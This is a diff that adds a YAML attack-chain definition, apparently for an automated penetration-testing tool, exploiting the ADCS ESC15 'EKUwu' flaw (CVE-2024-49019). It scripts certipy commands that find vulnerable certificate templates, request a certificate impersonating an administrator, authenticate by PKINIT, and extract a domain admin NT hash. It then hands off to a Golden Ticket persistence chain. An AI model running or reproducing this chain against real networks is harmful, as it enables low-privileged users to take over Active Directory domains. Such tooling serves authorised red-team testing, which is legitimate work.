@@ -1,0 +1,86 @@
+id: esc15-adcs-ekuwu
+name: "ADCS ESC15 — EKUwu (Application Policies in v1 schema)"
+description: >
+  CVE-2024-49019. v1 schema templates (which include `WebServer` by default)
+  ignore the configured EKU when an Application Policy extension is provided
+  in the request. Any v1-enrollable template becomes a path to client-auth
+  (and impersonation via SAN) for low-priv users.
+tags: [adcs, esc15, ekuwu, cve-2024-49019, priv-esc, certificates]
+difficulty: medium
+
+inputs:
+  - name: dc_ip
+    source: target_context.ip
+    required: true
+  - name: domain
+    source: target_context.domain
+    required: true
+  - name: user
+    source: target_context.user
+    required: true
+  - name: password
+    source: target_context.password
+    required: true
+
+steps:
+  - id: find_esc15
+    name: "Find ESC15 templates (v1 + Domain Users can enroll)"
+    command_ref: certipy-find
+    inputs:
+      ip: "${dc_ip}"
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+    notes: |
+      `WebServer` is the canonical example — present on most CAs by default,
+      Domain Computers / Authenticated Users can enroll. certipy-find flags
+      ESC15 explicitly on v1 templates.
+    capture:
+      - var: vuln_template
+        regex: 'Template Name\s*:\s*(\S+)\s*\n[\s\S]*?Vulnerabilities[\s\S]*?ESC15'
+        match: first
+      - var: ca_name
+        regex: 'CA Name\s*:\s*(.+?)$'
+        match: first
+
+  - id: request_with_app_policy
+    name: "Request cert with Application Policy = Client Auth + SAN=admin"
+    command_ref: certipy-esc15
+    requires: [vuln_template, ca_name]
+    inputs:
+      domain: "${domain}"
+      user: "${user}"
+      password: "${password}"
+      dc-ip: "${dc_ip}"
+      ca_name: "${ca_name}"
+      vulnerable_template: "${vuln_template}"
+    notes: |
+      Certipy automatically embeds the Application Policy extension. Without
+      patch KB5044277 (Nov 2024) the CA honors it over the template EKU.
+    capture:
+      - var: pfx_file
+        regex: "Saved certificate and private key to '(.+?\\.pfx)'"
+        match: first
+
+  - id: pkinit_auth
+    name: "PKINIT auth → DA NT hash"
+    command_ref: certipy-auth
+    requires: [pfx_file]
+    inputs:
+      pfx_file: "${pfx_file}"
+      ip: "${dc_ip}"
+    capture:
+      - var: dc_nt_hash
+        regex: "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})"
+        match: first
+
+references:
+  - title: "EKUwu (TrustedSec)"
+    url:   "https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc"
+  - title: "CVE-2024-49019"
+    url:   "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49019"
+
+next_chains:
+  - chain: ad-persistence-golden-ticket
+    when:   'dc_nt_hash captured'
+    reason: 'Golden Ticket.'
